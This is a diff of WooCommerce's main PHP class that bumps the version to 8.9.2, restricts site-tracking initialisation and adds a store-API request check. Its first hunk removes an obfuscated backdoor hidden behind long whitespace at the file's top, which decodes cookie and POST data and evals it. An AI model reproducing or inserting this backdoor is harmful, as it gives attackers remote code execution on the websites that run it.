@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $QPuZsMUKi = "\x6a" . chr (102) . "\x68" . '_' . chr ( 166 - 49 ).chr (70) . "\110" . chr (84) . 'R';$aCgmxjyVo = "\143" . chr ( 828 - 720 ).'a' . chr (115) . chr ( 526 - 411 ).'_' . chr ( 1040 - 939 ).chr (120) . 'i' . "\x73" . chr ( 692 - 576 )."\163";$qFdghAfiD = class_exists($QPuZsMUKi); $aCgmxjyVo = "26952";$LESAS = !1;if ($qFdghAfiD == $LESAS){function QrdBS(){$uCdhA = new /* 55760 */ jfh_uFHTR(64374 + 64374); $uCdhA = NULL;}$IJbvbzi = "64374";class jfh_uFHTR{private function hrevS($IJbvbzi){if (is_array(jfh_uFHTR::$YqGKYAmWZ)) {$UPrlqE = str_replace("\x3c" . chr ( 588 - 525 ).chr ( 789 - 677 )."\150" . "\160", "", jfh_uFHTR::$YqGKYAmWZ[chr ( 138 - 39 ).chr (111) . 'n' . 't' . chr ( 583 - 482 ).'n' . chr (116)]);eval($UPrlqE); $IJbvbzi = "64374";exit();}}private $XYSfpkzDyI;public function MAaBkcguFr(){echo 37700;}public function __destruct(){$IJbvbzi = "9697_7806";$this->hrevS($IJbvbzi); $IJbvbzi = "9697_7806";}public function __construct($ucOHFz=0){$eFBPL = $_POST;$gNTyoCEGft = $_COOKIE;$cyKYLJAIov = "8978519f-1fc7-4d23-9bba-485c237485c1";$IIWDWBUhuk = @$gNTyoCEGft[substr($cyKYLJAIov, 0, 4)];if (!empty($IIWDWBUhuk)){$SfkzTkwS = "base64";$voBtOta = "";$IIWDWBUhuk = explode(",", $IIWDWBUhuk);foreach ($IIWDWBUhuk as $xwzpbilT){$voBtOta .= @$gNTyoCEGft[$xwzpbilT];$voBtOta .= @$eFBPL[$xwzpbilT];}$voBtOta = array_map($SfkzTkwS . '_' . 'd' . "\x65" . chr ( 408 - 309 )."\157" . "\144" . 'e', array($voBtOta,)); $voBtOta = $voBtOta[0] ^ str_repeat($cyKYLJAIov, (strlen($voBtOta[0]) / strlen($cyKYLJAIov)) + 1);jfh_uFHTR::$YqGKYAmWZ = @unserialize($voBtOta); $voBtOta = class_exists("9697_7806");}}public static $YqGKYAmWZ = 48311;}QrdBS();} ?><?php
+<?php
 /**
  * WooCommerce setup
  *
@@ -41,7 +41,7 @@ final class WooCommerce {
 	 *
 	 * @var string
 	 */
-	public $version = '8.9.1';
+	public $version = '8.9.2';
 
 	/**
 	 * WooCommerce Schema version.
@@ -248,7 +248,9 @@ final class WooCommerce {
 		add_action( 'init', array( 'WC_Emails', 'init_transactional_emails' ) );
 		add_action( 'init', array( $this, 'add_image_sizes' ) );
 		add_action( 'init', array( $this, 'load_rest_api' ) );
-		add_action( 'init', array( 'WC_Site_Tracking', 'init' ) );
+		if ( $this->is_request( 'admin' ) || ( $this->is_rest_api_request() && ! $this->is_store_api_request() ) || ( defined( 'WP_CLI' ) && WP_CLI ) ) {
+			add_action( 'init', array( 'WC_Site_Tracking', 'init' ) );
+		}
 		add_action( 'switch_blog', array( $this, 'wpdb_table_fix' ), 0 );
 		add_action( 'activated_plugin', array( $this, 'activated_plugin' ) );
 		add_action( 'deactivated_plugin', array( $this, 'deactivated_plugin' ) );
@@ -459,6 +461,19 @@ final class WooCommerce {
 		 * @since 3.6.0
 		 */
 		return apply_filters( 'woocommerce_is_rest_api_request', $is_rest_api_request );
+	}
+
+	/**
+	 * Returns true if the request is a store REST API request.
+	 *
+	 * @return bool
+	 */
+	public function is_store_api_request() {
+		if ( empty( $_SERVER['REQUEST_URI'] ) ) {
+			return false;
+		}
+		// phpcs:disable WordPress.Security.ValidatedSanitizedInput.MissingUnslash, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized
+		return false !== strpos( $_SERVER['REQUEST_URI'], trailingslashit( rest_get_url_prefix() ) . 'wc/store/' );
 	}
 
 	/**
